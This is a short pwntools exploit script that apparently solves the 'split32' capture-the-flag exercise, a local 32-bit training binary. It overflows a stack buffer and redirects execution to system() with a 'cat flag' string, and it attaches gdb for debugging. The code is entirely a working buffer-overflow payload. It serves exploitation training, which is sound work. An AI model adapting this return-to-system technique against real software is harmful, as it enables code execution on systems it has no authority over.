from pwn import *

t = process("./split32")

gdb_cmd = ["c"]  # "b *0x08048653"

context.terminal = ["gnome-terminal", "-e"]
gdb.attach(t, gdbscript='\n'.join(gdb_cmd))

system_plt_address = 0x08048430
cat_flag_address = 0x0804a030
# buf = cyclic(120, n=4)
offset = cyclic_find("laaa", n=4)
print(offset)
buf = "A"*offset
buf += p32(system_plt_address)
buf += "B"*4
buf += p32(cat_flag_address)

t.recvuntil('\n>')
t.sendline(buf)

t.interactive()